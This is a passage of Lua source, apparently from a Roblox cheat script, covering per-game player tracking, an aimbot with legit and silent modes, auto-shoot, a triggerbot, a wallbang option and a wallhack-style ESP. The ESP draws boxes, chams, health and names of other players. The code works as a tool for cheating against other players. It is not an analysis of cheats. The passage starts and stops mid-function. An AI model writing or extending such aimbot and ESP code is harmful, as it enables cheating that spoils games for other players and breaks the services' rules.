					elseif GameTitle == "Recoil" then
						Character = FFC(workspace, Player.Name)
					else
						Character = Player.Character or FFC(workspace, Player.Name)
						if Character then
							if GameTitle == "Arsenal" then
								Character = FFC(Character, "Spawned") and Character
							elseif GameTitle == "MURDER" then
								Character = FFC(Player, "Status") and Player.Status.Alive.Value and Character
							elseif GameTitle == "Ace Of Spadez" then
								Character = Character.Parent and Character.Parent.Name ~= "Spectators" and Character
							elseif GameTitle == "Q-Clash" then
								Character = FFCoC(Character, "BillboardGui", true)
							end
						end
					end
				end

				if Character then 
					if Player ~= Client and not library.flags["Aimbot Ignore Spawn Protection"] then
						if GameTitle == "Bad Business" then
							if FFC(Character, "ShieldEmitter", true) then
								if Character.Root.ShieldEmitter.Enabled then
									return
								end
							end
						elseif GameTitle ~= "Phantom Forces" then
							if FFC(Character, "ForceField") then
								return
							end
						end
					end
					return Character
				end
			else
				if not Character then return (index == "Health" or index == "MaxHealth" and 0) end
				if index == "Health" then
					local Health
					if GameTitle == "Bad Business" then
						Health, MaxHealth = FFC(Character, "Health") and Character.Health.Value, 150
					elseif GameTitle == "Phantom Forces" then
						Health, MaxHealth = HealthRequest:getplayerhealth(Player), 100
					elseif GameTitle == "MURDER" or GameTitle == "Arsenal" or GameTitle == "Unit: Classified" then
						Health, MaxHealth = FFC(Player, "NRPBS") and Player.NRPBS.Health.Value, Player.NRPBS.MaxHealth.Value
					--elseif GameTitle == "Q-Clash" then
					--	Health, MaxHealth = HealthRequest(Character)
					else
						local Humanoid = FFCoC(Character, "Humanoid")
						if Humanoid then
							Health, MaxHealth = Humanoid.Health, Humanoid.MaxHealth
						end
					end
					return Health and (Health > 0 and Health) or 0
				elseif index == "MaxHealth" then
					return MaxHealth or 0
				elseif index == "Enemy" then
					if Player.ClassName == "Model" then
						return GameTitle == "Blackhawk Rescue Mission" and (Player.Name:find("Infantry") and true or false) or true
					else
						if GameTitle == "Blackhawk Rescue Mission" or GameTitle == "R2DA" or GameTitle == "Resurrection" or GameTitle == "Project Lazarus" or GameTitle == "MMC Zombies Project" or GameTitle == "Zombie Rush" or GameTitle == "Zombie Attack" then
							return false
						elseif GameTitle == "Bad Business" then
							return TeamRequest({}, Client) ~= TeamRequest({}, Player) 
						elseif GameTitle == "Q-Clash!" then
							local ClientChar = Client.Character
							return Character and ClientChar and Character.Parent ~= ClientChar.Parent
						elseif GameTitle == "Recoil" then
							return FFC(Player, "GameStats") and Client.GameStats.Team.value ~= Player.GameStats.Team.value
						elseif GameTitle == "Shoot Out" then
							return (Cowboys[Client] and Cowboys or Sheriffs) ~= (Cowboys[Player] and Cowboys or Sheriffs)
						else
							if Client.Team then
								return Client.Team ~= Player.Team
							else
								return true
							end
						end
					end
				end
			end

		end})
	end

	local function AddTracker(Tracking)
		for _,Player in next, Tracking:GetChildren() do
			if GameTitle == "Blackhawk Rescue Mission" then
				if Tracking == PlayerServ then
					Track(Player)
				else
					if Player.Name:find("Infantry") or Player.Name:find("Civilian") then
						Track(Player)
					end
				end
			else
				Track(Player)
			end
		end

		library:AddConnection(Tracking.ChildAdded, function(Player)
			wait(1)
			if Tracking == PlayerServ and library then
				library.options["Player List"]:AddValue(Player.Name)
			end
			if GameTitle == "Blackhawk Rescue Mission" then
				if Tracking == PlayerServ then
					Track(Player)
				else
					if Player.Name:find"Infantry" or Player.Name:find"Civilian" then
						Track(Player)
					end
				end
			else
				Track(Player)
			end
		end)

		library:AddConnection(Tracking.ChildRemoved, function(Player)
			if Players[Player] then
				if table.find(library.options["Player List"].values, Player.Name) then
					if library.hasInit then
						library.options["Player List"]:RemoveValue(Player.Name)
					end
				end
				Players[Player] = nil
				if ESPObjects[Player] then
					ESPObjects[Player].Active = false
					ESPObjects[Player].OOVArrow.Visible = false
					ESPObjects[Player].Invis()
					ESPObjects[Player].InvisChams()
					ESPObjects[Player].InvisChamsOutline()
					ESPObjects[Player].InvisRadar()
				end
			end
		end)
	end

	library:AddConnection(workspace.ChildAdded, function(Obj)
		if Obj.ClassName == "Camera" then
			Camera = Obj
			WTSP = Obj.WorldToScreenPoint
			WTVP = Obj.WorldToViewportPoint
		end
	end)

	--UI
	--local RadarWindow = library:Create("Circle", {NumSides = 64, Radius = 100, Filled = true, Color = Color3.fromRGB(30, 30, 30)})
	local Draw = library:Create("Circle", {NumSides = 64, Thickness = 1})

	local CrosshairTop = library:Create("Square", {Filled = true})
	local CrosshairLeft = library:Create("Square", {Filled = true})
	local CrosshairRight = library:Create("Square", {Filled = true})
	local CrosshairBottom = library:Create("Square", {Filled = true})

	--Aimbot Module
	local AimbotRayParams = RaycastParams.new()
	AimbotRayParams.FilterType = Enum.RaycastFilterType.Whitelist
	AimbotRayParams.IgnoreWater = true

	local AimbotHitboxes = {}

	library.Aimbot = {
		Target = nil,
		Player = nil,
		Distance = nil,
		Position = nil,
		Position3d = nil,
		LastPosition = V3Empty,
		PositionOffset = nil,
		PositionOffset2d = nil,
		Part = nil,
		OnScreen = false,
		LastVisible = false,
		Step = 0,
		OldStep = 0,
		AutoShootStep = 0
	}

	library.Aimbot.Reset = function()
		library.Aimbot.Target = nil
		library.Aimbot.Player = nil
		library.Aimbot.Distance = 9e9
		library.Aimbot.Position = nil
		library.Aimbot.Position3d = nil
		library.Aimbot.LastPosition = V3Empty
		library.Aimbot.PositionOffset = nil
		library.Aimbot.PositionOffset2d = nil
		library.Aimbot.Part = nil
		library.Aimbot.OnScreen = false
		library.Aimbot.LastVisible = false
		library.Aimbot.Step = 0
		library.Aimbot.SwitchStep = 0
		library.Aimbot.AutoShootStep = 0
	end

	library.Aimbot.Check = function(Player, Steady, Step)
		if not Players[Player] then return end
		local Character, ClientChar = Players[Player].Character, Players[Client].Character
		if Players[Player].Health > 0.1 and Character and ClientChar then
			local MX, MY = Mouse.X, Mouse.Y
			if library.flags["Mouse Offset"] then
				MX = MX + library.flags["MXO Amount"]
				MY = MY + library.flags["MYO Amount"]
			end

			local Target
			local OldDist = 9e9
			if library.flags["Aimbot Randomize Hitbox"] then
				if library.Aimbot.Part then
					Target = GetHitboxFromChar(Character, library.Aimbot.Part)
				else
					if not Target then
						local PartName = AimbotHitboxes[math.random(1, #AimbotHitboxes)]
						Target = GetHitboxFromChar(Character, PartName)
						library.Aimbot.Part = PartName
					end
				end
			else
				for i,v in next, library.flags["Aimbot Hitboxes"] do
					if not v then continue end

					local Part = GetHitboxFromChar(Character, i)
					if not Part then continue end

					local ScreenPos = WTSP(Camera, Part.Position)
					local Dist = (Vector2.new(MX, MY) - Vector2.new(ScreenPos.X, ScreenPos.Y)).Magnitude

					if Dist > OldDist then continue end

					OldDist = Dist
					Target = Part			
				end
			end
			if not Target then return end

			local Position, OnScreen = WTSP(Camera, Target.Position)
			if library.flags["Aimbot Mode"] ~= "Silent" then
				if not OnScreen then
					return
				end
			end

			local DistanceFromCharacter = (Target.Position - Camera.CFrame.p).Magnitude
			if DistanceFromCharacter > library.flags["Aimbot Max Distance"] then return end

			local DistanceFromMouse = (Vector2.new(MX, MY) - Vector2.new(Position.X, Position.Y)).Magnitude
			if library.flags["Use FOV"] then
				local FoVSize = library.flags["FOV Size"]
				if DistanceFromMouse > FoVSize + (library.flags["Dynamic FOV"] and ((120 - Camera.FieldOfView) * 4) or FoVSize) then
					return
				end
			end

			local Hit
			if library.flags["Aimbot Vis Check"] or library.flags["Auto Shoot"] or library.flags["Aimbot Prioritize"] then
				Hit = RayCheck(ClientChar, Target.Position, library.flags["Aimbot Max Distance"])
				Hit = Hit and Hit.Instance and FFA(Hit.Instance, Character.Name) == Character
				if Hit then
					if library.flags["Auto Shoot"] then
						library.Aimbot.AutoShootStep = library.Aimbot.AutoShootStep + Step
						if library.Aimbot.AutoShootStep > library.flags["Auto Shoot Interval"] * 0.001 then
							library.Aimbot.AutoShootStep = 0
							if library.flags["Aimbot Mode"] == "Silent" then
								mouse1click()
							else
								AimbotRayParams.FilterDescendantsInstances = {Character}
								local Pos = Camera.CFrame.p
								if workspace:Raycast(Pos, (Camera:ScreenPointToRay(MX, MY, 10000).Origin - Pos).Unit * library.flags["Aimbot Max Distance"], AimbotRayParams) then
									mouse1click()
								end
							end
						end
					end
				else
					if library.flags["Aimbot Vis Check"] then
						return
					end
					if library.flags[GameTitle .. " Wallbang"] and library.flags["Auto Shoot"] then
						library.Aimbot.AutoShootStep = library.Aimbot.AutoShootStep + Step
						if library.Aimbot.AutoShootStep > library.flags["Auto Shoot Interval"] * 0.001 then
							library.Aimbot.AutoShootStep = 0
							mouse1click()
						end
					end
				end
			end

			library.Aimbot.PositionOffset = library.Aimbot.PositionOffset or V3Empty
			library.Aimbot.PositionOffset2d = library.Aimbot.PositionOffset2d or V3Empty
			if library.flags["Velocity Prediction"] then
				local Diff = (Target.Position - library.Aimbot.LastPosition)
				if Diff.Magnitude > (library.flags["Aimbot Mode"] == "Legit" and 0.05 or 0.01) then
					library.Aimbot.PositionOffset = Diff.Unit * library.flags["Velocity Prediction Multiplier"]
					library.Aimbot.PositionOffset2d = WTSP(Camera, Target.Position + library.Aimbot.PositionOffset) - Position
				else
					library.Aimbot.PositionOffset = V3Empty
					library.Aimbot.PositionOffset2d = V3Empty
				end
			end

			if Players[Player].Priority then
				library.Aimbot.Target = Target
				library.Aimbot.Player = Player
				library.Aimbot.Position3d = Target.Position + library.Aimbot.PositionOffset
				library.Aimbot.Position = Position + library.Aimbot.PositionOffset2d
				library.Aimbot.OnScreen = OnScreen
				return true
			end

			if not Steady then
				if library.flags["Aimbot Priority"] == "Mouse" then
					if DistanceFromMouse <= library.Aimbot.Distance then
						library.Aimbot.Distance = DistanceFromMouse
					else
						return
					end
				else
					if DistanceFromCharacter <= library.Aimbot.Distance then
						library.Aimbot.Distance = DistanceFromCharacter
					else
						return
					end
				end
			end

			if library.flags["Aimbot Prioritize"] then
				if not Hit then
					if library.Aimbot.LastVisible then
						return
					end
				end
			end

			library.Aimbot.Target = Target
			library.Aimbot.Player = Player
			library.Aimbot.Position3d = Target.Position + library.Aimbot.PositionOffset
			library.Aimbot.Position = Position + library.Aimbot.PositionOffset2d
			library.Aimbot.OnScreen = OnScreen
			return true
		end
	end

	library.Aimbot.Run = function(Step)
		if library.Aimbot.Check(library.Aimbot.Player, true, Step) then
			if library.flags["Aimbot Mode"] == "Legit" then
				local AimAtX, AimAtY = library.Aimbot.Position.X, library.Aimbot.Position.Y
				local MX, MY = Mouse.X, Mouse.Y

				if library.flags["Mouse Offset"] then
					MX = MX + library.flags["MXO Amount"]
					MY = MY + library.flags["MYO Amount"]
				end

				AimAtX, AimAtY = AimAtX - MX, AimAtY - MY

				--local MinDist = 10
				--local mouseSens = UserSettings():GetService"UserGameSettings".MouseSensitivity
				local Smoothness = library.flags["Aimbot Smoothness"]
				if library.flags["Aimbot Snap"] then
					if math.abs(AimAtX) >= Smoothness or math.abs(AimAtY) >= Smoothness then
						AimAtX = AimAtX / Smoothness
						AimAtY = AimAtY / Smoothness
					end
				else
					if Smoothness > 1 then
						AimAtX = AimAtX / Smoothness
						AimAtY = AimAtY / Smoothness
					end
				end

				mousemoverel(AimAtX, AimAtY)
			end

			library.Aimbot.LastPosition = library.Aimbot.Target.Position
			if library.flags["Aim Lock"] then
				return
			end
		else
			library.Aimbot.Reset()
		end
		library.Aimbot.SwitchStep = library.Aimbot.SwitchStep + Step
		if library.Aimbot.Player then
			if library.Aimbot.SwitchStep < library.flags["Aimbot Switch Delay"] * 0.001 then return end
		end
		library.Aimbot.SwitchStep = 0
		library.Aimbot.Distance = 9e9
		for Player, Data in next, Players do
			if Player == Client or Data.Whitelist then continue end
			if (library.flags["Aimbot At Teammates"] or Data.Enemy) then
				if library.Aimbot.Check(Player, false, 0) and Data.Priority then
					break
				end
			end
		end
	end

	local TriggerStep = 0
	local function RunTriggerbot()
		local ClientChar = Players[Client].Character
		if not ClientChar then return end
		for _, Data in next, Players do
			local Character = Data.Character
			if Character and (library.flags["Triggerbot Teammates"] or Data.Enemy) then
				local MX, MY = Mouse.X, Mouse.Y
				if library.flags["Mouse Offset"] then
					MX = MX + library.flags["MXO Amount"]
					MY = MY + library.flags["MYO Amount"]
				end
				local Hit = RayCheck(ClientChar, Camera:ScreenPointToRay(MX, MY, 2000).Origin, 2000)
				if Hit and Hit.Instance then
					if library.flags["Triggerbot Hitbox"] == "Character" and Hit.Instance:IsDescendantOf(Character) or Hit.Instance.Name == library.flags["Triggerbot Hitbox"] then
						--if library.flags["Triggerbot Magnet"] then
						--	local ScreenPos = WTSP(Camera, Hit.Instance.Position)
						--	local AimAtX, AimAtY = (ScreenPos.X - Mouse.X) - MX, (ScreenPos.Y - Mouse.Y) - MY
						--	mousemoverel(AimAtX, AimAtY)
						--end
						--print"click"
						mouse1click()
					end
				end
			end
		end
	end

	local AimbotTab = library:AddTab"Aimbot"
	local AimbotColumn = AimbotTab:AddColumn()
	local AimbotColumn1 = AimbotTab:AddColumn()

	local AimbotMain = AimbotColumn:AddSection"Main"
	local AimbotTargeting = AimbotColumn:AddSection"Targeting"
	local AimbotMisc = AimbotColumn1:AddSection"Misc"
	local TriggerbotMain = AimbotColumn1:AddSection"Triggerbot"

	AimbotMain:AddToggle({text = "Enabled", flag = "Aimbot", callback = function(State)
		Draw.Visible = State and library.flags["Use FOV"] and library.flags["Draw Circle"]
		if library.flags["Aimbot Always On"] then
			library.options["Aimbot Always On"]:SetState(true)
		end
	end}):AddList({text = "Mode", flag = "Aimbot Mode", values = {"Legit", "Rage"}, callback = function(Value)
		library.options["Aimbot Smoothness"].main.Visible = Value == "Legit"
		library.options["Aimbot Snap"].main.Visible = Value == "Legit"
		library.options["Mouse Offset"].main.Visible = Value == "Legit"
		library.options["MXO Amount"].main.Visible = Value == "Legit" and library.flags["Mouse Offset"]
		library.options["MYO Amount"].main.Visible = Value == "Legit" and library.flags["Mouse Offset"]
	end}):AddBind({flag = "Aimbot Key", mode = "hold", callback = function(Ended, Step)
		if library.flags["Aimbot"] and not library.flags["Aimbot Always On"] then
			if library.open or Ended then
				library.Aimbot.Reset()
			else
				library.Aimbot.Step = library.Aimbot.Step + Step
				if library.Aimbot.Step > 0.016 then
					library.Aimbot.Step = 0
					library.Aimbot.Run(Step)
				end
			end
		end
	end})
	AimbotMain:AddToggle({text = "Always On", flag = "Aimbot Always On", callback = function(State)
		if not State then return end

		library:AddConnection(runService.RenderStepped, "Aimbot", function(Step)
			if library.open then library.Aimbot.Reset() return end
			if library.flags["Aimbot"] and library.flags["Aimbot Always On"] then
				library.Aimbot.Step = library.Aimbot.Step + Step
				if library.Aimbot.Step > 0.016 then
					library.Aimbot.Step = 0
					library.Aimbot.Run(Step)
				end
			else
				library.connections["Aimbot"]:Disconnect()
				library.Aimbot.Reset()
			end
		end)
	end})
	AimbotMain:AddSlider({text = "Smoothness", flag = "Aimbot Smoothness", min = 1, max = 40})
	AimbotMain:AddToggle({text = "Velocity Prediction", state = false, callback = function(State)
		library.options["Velocity Prediction Multiplier"].main.Visible = State
	end})
	AimbotMain:AddSlider({text = "Multiplier", textpos = 2, flag = "Velocity Prediction Multiplier", min = 1, max = 5, float = 0.1})
	--AimbotMain:AddSlider({text = "Prediction Interval", min = 1, max = 1000})
	AimbotMain:AddToggle({text = "Snap Near Target", flag = "Aimbot Snap"})--:AddSlider({text = "Snap Range" flag = "Aimbot Snap Range", min = 5, max = 50})
	--AimbotMain:AddToggle({text = "Curve", flag = "Aimbot Curve"}):AddSlider({text = "Size", flag = "Aimbot Curve Size", min = 1, max = 50})
	AimbotMain:AddToggle({text = "Lock Target", flag = "Aim Lock"})
	AimbotMain:AddToggle({text = "Auto Shoot", callback = function(State)
		library.options["Auto Shoot Interval"].main.Visible = State
		if State then
			library.options["Triggerbot"]:SetState()
		end
	end})
	AimbotMain:AddSlider({text = "Interval", textpos = 2, flag = "Auto Shoot Interval", min = 16, max = 1000, suffix = "ms"})
	--AimbotMain:AddToggle({text = "Randomization"})
	--AimbotMain:AddSlider({text = "Amount", flag = "Randomize Amount", min = 40, max = 100})
	AimbotMain:AddSlider({text = "Target Switch Delay", flag = "Aimbot Switch Delay", min = 16, max = 500, suffix = "ms"})
	AimbotMain:AddToggle({text = "Ignore Spawn Protection", flag = "Aimbot Ignore Spawn Protection"})

	AimbotTargeting:AddToggle({text = "Visible Only", flag = "Aimbot Vis Check", callback = function(State)
		if State then
			--library.options["Aimbot Prioritize"]:SetState()
		end
	end})
	--AimbotTargeting:AddToggle({text = "Prioritize Visible", flag = "Aimbot Prioritize", callback = function(State)
	--	if State then
	--		library.options["Aimbot Vis Check"]:SetState()
	--	end
	--end})
	AimbotTargeting:AddToggle({text = "At Teammates", flag = "Aimbot At Teammates"})
	AimbotTargeting:AddList({text = "Priority", flag = "Aimbot Priority", values = {"Mouse", "Distance"}})
	AimbotTargeting:AddList({text = "Hitboxes", flag = "Aimbot Hitboxes", max = 6, multiselect = true, values = UseBodyParts, callback = function(Values)
		for i,v in next, Values do
			if v then
				if table.find(AimbotHitboxes, i) then continue end
				table.insert(AimbotHitboxes, i)
			else
				local pos = table.find(AimbotHitboxes, i)
				if not pos then continue end
				table.remove(AimbotHitboxes, pos)
			end
		end
	end})
	AimbotTargeting:AddToggle({text = "Randomize Hitbox", flag = "Aimbot Randomize Hitbox"})

	AimbotTargeting:AddSlider({text = "Max Distance", flag = "Aimbot Max Distance", value = 10000, min = 0, max = 10000})

	AimbotMisc:AddToggle({text = "Mouse Offset", callback = function(State)
		if library.flags["Aimbot Mode"] == "Legit" then
			library.options["MXO Amount"].main.Visible = State
			library.options["MYO Amount"].main.Visible = State
		end
	end})
	AimbotMisc:AddSlider({text = "X", textpos = 2, flag = "MXO Amount", min = -100, max = 100, value = 0})
	AimbotMisc:AddSlider({text = "Y", textpos = 2, flag = "MYO Amount", min = -100, max = 100, value = 0})
	AimbotMisc:AddToggle({text = "Highlight Target"}):AddColor({flag = "Aimbot Highlight Color", color = Color3.fromRGB(240, 20, 255)})
	AimbotMisc:AddToggle({text = "Use FOV", callback = function(State) Draw.Visible = State and library.flags["Aimbot"] and library.flags["Draw Circle"] end}):AddSlider({text = "Size", flag = "FOV Size", min = 10, max = 300, callback = function(Value) if not library.flags["Dynamic FOV"] then Draw.Radius = Value * 2 end end})
	AimbotMisc:AddToggle({text = "Dynamic", flag = "Dynamic FOV", callback = function(State)
		if State then
			library:AddConnection(runService.RenderStepped, "Dynamic FOV", function()
				if library and library.flags["Dynamic FOV"] then
					Draw.Radius = library.flags["FOV Size"] + ((120 - Camera.FieldOfView) * 4)
				else
					library.connections["Dynamic FOV"]:Disconnect()
					Draw.Radius = library.flags["FOV Size"] * 2
				end
			end)
		end
	end})
	AimbotMisc:AddToggle({text = "Draw Circle", callback = function(State) Draw.Visible = State and library.flags["Aimbot"] and library.flags["Use FOV"] end}):AddColor({flag = "FOV Circle Color", Color3.fromRGB(240, 20, 255), trans = 1, callback = function(Color) Draw.Color = Color end, calltrans = function(Value) Draw.Transparency = Value end})
	AimbotMisc:AddToggle({text = "Fill", flag = "FOV Fill", callback = function(State) Draw.Filled = State end})

	TriggerbotMain:AddToggle({text = "Enabled", flag = "Triggerbot", callback = function(State)
		if State then
			library.options["Auto Shoot"]:SetState()
			if library.flags["Triggerbot Always On"] then
				library.options["Triggerbot Always On"]:SetState(true)
			end
		end
	end}):AddSlider({text = "Delay", flag = "Triggerbot Delay", min = 16, max = 1000, suffix = "ms"}):AddBind({flag = "Triggerbot Key", mode = "hold", callback = function(Ended, Step)
		if library.flags["Triggerbot"] and not library.flags["Triggerbot Always On"] then
			if not library.open then
				TriggerStep = TriggerStep + Step
				if TriggerStep > library.flags["Triggerbot Delay"] * 0.001 then
					TriggerStep = 0
					RunTriggerbot()
				end
			end
		end
	end})
	TriggerbotMain:AddToggle({text = "Always On", flag = "Triggerbot Always On", callback = function(State)
		if State then
			library:AddConnection(runService.RenderStepped, "Triggerbot", function(Step)
				if library.open then return end
				if library.flags["Triggerbot"] and library.flags["Triggerbot Always On"] then
					TriggerStep = TriggerStep + Step
					if TriggerStep > library.flags["Triggerbot Delay"] * 0.001 then
						TriggerStep = 0
						RunTriggerbot(Step)
					end
				else
					library.connections["Triggerbot"]:Disconnect()
				end
			end)
		end
	end})
	--TriggerbotMain:AddToggle({text = "Magnet", flag = "Triggerbot Magnet"})
	TriggerbotMain:AddList({text = "Hitbox", flag = "Triggerbot Hitbox", values = {"Head", "Torso", "Character"}})
	TriggerbotMain:AddToggle({text = "At Teammates", flag = "Triggerbot Teammates"})

	--Esp module

	local VisualsTab = library:AddTab"Visuals"
	local VisualsColumn = VisualsTab:AddColumn()
	local VisualsColumn1 = VisualsTab:AddColumn()

	local HealthBarAddon = Vector2.new(3)
	local PlayerEspSection = VisualsColumn:AddSection"ESP"
	local OldStep = 0
	PlayerEspSection:AddToggle({text = "Enabled", flag = "Esp Enabled", callback = function(State)
		if not State then
			--RadarWindow.Visible = false
			if library.connections["Player ESP"] then
				library.connections["Player ESP"]:Disconnect()
				for _, v in next, ESPObjects do
					v.OOVArrow.Visible = false
					v.Invis()
					v.InvisChams()
					v.InvisChamsOutline()
				end
			end

			return
		end

		--RadarWindow.Visible = library.flags["Radar Enabled"]
		library:AddConnection(runService.RenderStepped, "Player ESP", function(Step)
			OldStep = OldStep + Step
			if OldStep < 0.016 then return end
			OldStep = 0

			for Player, Data in next, Players do
				if Player == Client then continue end
				local Objects = ESPObjects[Player]
				local Character = Data.Character

				local Show
				local Team = Data.Enemy
				if Data.Whitelist then
					Show = library.flags["Esp Show Whitelisted"]
				else
					Show = Data.Priority or library.flags["Esp Enabled For"][Team and "Enemies" or "Teammates"]
				end

				if Show and Character then
					local Health = Data.Health

					if Health > 0.1 then
						Team = Team and "Enemy" or "Team"

						local Pos, Size = GBB(Character)
						local RootPart = FFC(Character, "HumanoidRootPart")
						if RootPart and (Pos.Position - RootPart.Position).Magnitude > 5 then
							Pos = RootPart.CFrame
						end

						local Distance = (Camera.CFrame.p - Pos.Position).Magnitude
						if Distance < library.flags["Esp Max Distance"] then

							local ScreenPosition, OnScreen = WTVP(Camera, Pos.Position)

							local ClientChar = Players[Client].Character
							local Ignores = {Camera, ClientChar}
							if GameTitle == "Bad Business" then
								Ignores[3] = FFC(workspace, "Arms")
								--Ignores[4] = ClientChar and FFC(workspace, ClientChar.Backpack.Equipped.Value.Name)
								Ignores[5] = workspace.NonProjectileGeometry
								Ignores[6] = workspace.Effects
								Ignores[7] = workspace.Spawns
								Ignores[8] = workspace.Ragdolls
								Ignores[9] = workspace.Gameplay
								Ignores[10] = workspace.Throwables
							elseif GameTitle == "Phantom Forces" then
								Ignores[3] = workspace.Ignore
							end
							local Hit = RayCheck(ClientChar, Pos.Position, Distance)
							Hit = Hit and Hit.Instance and FFA(Hit.Instance, Character.Name)
							Hit = Hit and Hit == Character
							local Occluded = Hit and " " or " Occluded "

							local Visible = true
							if library.flags[Team .. " Visible Only"] then
								Visible = Hit ~= nil
							end

							local Color = (library.flags["Highlight Target"] and library.Aimbot.Player == Player and library.flags["Aimbot Highlight Color"])
							Color = Color or (Data.Priority and library.flags["Player Priority Color"] or Data.Whitelist and library.flags["Player Whitelist Color"])
							Color = Color or (GameTitle == "KAT" and (workspace.Gamemode.Value == "Murder" and ((FFC(Player.Backpack, "Knife") or FFC(Character, "Knife")) and library.flags[GameTitle .. " Murderer Color"] or (FFC(Player.Backpack, "Revolver") or FFC(Character, "Revolver")) or library.flags[GameTitle .. " Sheriff Color"])) or GameTitle == "MURDER" and ((Player.Status.Role.Value == "Murderer" and library.flags[GameTitle .. " Murderer Color"]) or (Player.Status.HasRevolver.Value and library.flags[GameTitle .. " Detective Color"])) or GameTitle == "Arsenal" and Player.NRPBS.EquippedTool.Value:find("Golden") and library.flags[GameTitle .. " Golden Weapon Color"])

							--
							if library.flags["Radar Enabled"] and Distance < RadarWindow.Radius then
								Objects.RadarBlip.Visible = true

								local RelativePos = Camera.CFrame:Inverse() * Pos.Position
								local Middle = Camera.ViewportSize / 2
								local Degrees = math.deg(math.atan2(-RelativePos.Y, RelativePos.X)) * math.pi / 180
								local EndPos = Middle + (Vector2.new(math.cos(Degrees), math.sin(Degrees)) * Distance)

								Objects.RadarBlip.Position = EndPos
								Objects.RadarBlip.Color = Color or Color3.new(1, 1, 1)

								if not Objects.Visible then
									continue
								end
							else
								Objects.RadarBlip.Visible = false
							end
							--]]

							if Visible then
								local Transparency = (library.Aimbot.Player == Player or Data.Priority) and 1 or 1 - (Distance / library.flags["Esp Max Distance"])

								if OnScreen then
									Objects.Visible = true
									Objects.OOVArrow.Visible = false

									--local xMin, yMin = 9e9, 9e9
									--local xMax, yMax = 0, 0

									local BoxColor = Color or library.flags[Team .. Occluded .. "Box Color"]
									local TextColor = Color or library.flags[Team .. Occluded .. "Info Color"]
									local LookColor = Color or library.flags[Team .. Occluded .. "Look Color"]
									local ChamsColor = Color or library.flags[Team .. Occluded .. "Chams Color"]
									local ChamsOutlineColor = Color or library.flags[Team .. Occluded .. "Chams Outline Color"]
									local DirectionColor = Color or library.flags[Team .. Occluded .. "Direction Color"]

									--Chams
									if library.flags[Team .. " Chams Enabled"] and Distance < 600 then
										Objects.ChamsVisible = true
										Objects.Chams.Parent = library.base
										Objects.ChamsStep = Objects.ChamsStep + Step
										if Objects.ChamsStep > 0.2 then
											Objects.ChamsStep = 0
											for _, PartName in next, UseBodyParts do
												local Part = FFC((GameTitle == "Bad Business" and Character.Body or Character), PartName, true)
												if Part then
													local Cham = FFC(Objects.Chams, PartName) or (function()
														return library:Create("Highlight", {
															Name = PartName,
															--AlwaysOnTop = true,
															Parent = Objects.Chams
														})
													end)()

													--Cham.Size = Part.Size
													Cham.Adornee = Part
													Cham.FillTransparency = library.flags[Team .. " Chams Transparency"]
													Cham.FillColor = ChamsColor

													if library.flags[Team .. " Chams Outline"] then
														Objects.ChamsOutlineVisible = true
														Objects.ChamsOutline.Parent = library.base

														--Cham.Size = Part.Size * 1.2
														Cham.Adornee = Part
														Cham.OutlineTransparency = library.flags[Team .. " Chams Transparency"]
														Cham.OutlineColor = ChamsOutlineColor
													else
														if Objects.ChamsOutlineVisible then
															Objects.InvisChamsOutline()
														end
													end
												else
													local Cham = FFC(Objects.Chams, PartName)
													if Cham then
														Cham.Visible = false
													end
													Cham = FFC(Objects.ChamsOutline, PartName)
													if Cham then
														Cham.Visible = true
													end
												end
											end
										end
									else
										if Objects.ChamsVisible then
											Objects.InvisChams()
											Objects.InvisChamsOutline()
										end
									end

									--ESP
									local Height = (Camera.CFrame - Camera.CFrame.p) * Vector3.new(0, (math.clamp(Size.Y, 1, 10) + 0.5) / 2, 0)
									Height = math.abs(WTSP(Camera, Pos.Position + Height).Y - WTSP(Camera, Pos.Position - Height).Y)
									--local ViewportSize = Camera.ViewportSize
									--local Size = ((ViewportSize.X + ViewportSize.Y) / Distance) * (1 - (Camera.FieldOfView / 200))
									Size = library.round(Vector2.new(Height / 2, Height))
									local Position = library.round(Vector2.new(ScreenPosition.X, ScreenPosition.Y) - (Size / 2))

									if library.flags[Team .. " Box Enabled"] then
										Objects.Box.Visible = true
										Objects.Box.Color = BoxColor
										Objects.Box.Size = Size
										Objects.Box.Position = Position
										Objects.Box.Transparency = Transparency

										Objects.BoxOutline.Visible = true
										Objects.BoxOutline.Size = Size + V222
										Objects.BoxOutline.Position = Position - V211
										Objects.BoxOutline.Transparency = Transparency

										Objects.BoxInline.Visible = true
										Objects.BoxInline.Size = Size - V222
										Objects.BoxInline.Position = Position + V211
										Objects.BoxInline.Transparency = Transparency
									else
										Objects.Box.Visible = false
										Objects.BoxOutline.Visible = false
										Objects.BoxInline.Visible = false
									end

									if library.flags[Team .. " Health Enabled"] then
										local MaxHealth = Data.MaxHealth
										local HealthPerc = Health / MaxHealth
										local Position = Position - HealthBarAddon
										local Size = Vector2.new(1, Size.Y)

										Objects.BarOutline.Visible = true
										Objects.BarOutline.Position = Position - V211
										Objects.BarOutline.Size = Size + V222
										Objects.BarOutline.Transparency = Transparency

										Objects.Bar.Visible = true
										Objects.Bar.Color = Color3.new(1 - HealthPerc, HealthPerc, 0.2)
										Objects.Bar.Position = Position + Vector2.new(0, Size.Y)
										Objects.Bar.Size = Vector2.new(1, -Size.Y * HealthPerc)
										Objects.Bar.Transparency = Transparency

										Objects.HealthText.Visible = HealthPerc < 0.99
										Objects.HealthText.Position = Objects.Bar.Position + Objects.Bar.Size - Vector2.new(0, 7)
										Objects.HealthText.Text = tostring(library.round(Health)) or ""
										Objects.HealthText.Transparency = Transparency
									else
										Objects.BarOutline.Visible = false
										Objects.Bar.Visible = false
										Objects.HealthText.Visible = false
									end

									if library.flags[Team .. " Info"] then
										Objects.NameText.Visible = true
										Objects.NameText.Text = GameTitle == "Blackhawk Rescue Mission" and (Player.ClassName == "Model" and (Player.Name:find("Infantry") and "Infantry" or "Civilian")) or Player.Name
										Objects.NameText.Position = Position + Vector2.new(Size.X / 2, -Objects.NameText.TextBounds.Y - 1)
										Objects.NameText.Color = TextColor
										Objects.NameText.Transparency = Transparency

										Objects.DistanceText.Visible = true
										Objects.DistanceText.Text = "[" .. library.round(Distance) .. "m]"
										Objects.DistanceText.Position = Position + Vector2.new(Size.X / 2, Size.Y + 2)
										Objects.DistanceText.Color = TextColor
										Objects.DistanceText.Transparency = Transparency
									else
										Objects.NameText.Visible = false
										Objects.DistanceText.Visible = false
									end

									if library.flags[Team .. " Look Enabled"] then
										HeadPosition = GetHitboxFromChar(Character, "Head")
										if HeadPosition then
											Objects.LookAt.Visible = true
											HeadPosition1 = WTVP(Camera, HeadPosition.Position)
											local To = WTVP(Camera, HeadPosition.Position + (HeadPosition.CFrame.LookVector * 8))

